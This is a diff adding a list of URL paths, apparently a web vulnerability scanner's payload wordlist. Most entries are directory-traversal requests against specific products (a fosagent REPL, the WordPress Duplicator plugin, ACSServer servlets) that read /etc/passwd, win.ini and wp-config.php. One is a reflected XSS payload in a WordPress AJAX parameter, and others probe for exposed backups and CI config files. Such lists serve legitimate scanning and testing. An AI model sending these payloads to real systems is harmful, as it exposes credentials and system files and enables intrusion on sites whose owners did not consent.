@@ -1,0 +1,14 @@
+/fosagent/repl/download-file?basedir=4&filepath=..\..\Windows\win.ini
+/fosagent/repl/download-snapshot?name=..\..\..\..\..\..\..\Windows\win.ini
+/wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+/wp-admin/admin-ajax.php?action=duplicator_download&file=%2F..%2Fwp-config.php
+/cache/backup/
+/ACSServer/DownloadFileServlet?show_file_name=../../../../../../etc/passwd&type=uploadfile&path=anything
+/ACSServer/DownloadFileServlet?show_file_name=../../../../../../windows/win.ini&type=uploadfile&path=anything
+/ACSServer/WebServlet?act=getMapImg_acs2&filename=../../../../../../../etc/passwd
+/ACSServer/WebServlet?act=getMapImg_acs2&filename=../../../../../../../windows/win.ini
+/download/C%3a%2fwindows%2fsystem.ini
+/wp-admin/admin-ajax.php?action=lwp_forgot_password&ID=<svg%20onload=alert(document.domain)>
+/.travis.yml
+/matomo/.travis.yml
+/ckeditor/.travis.yml
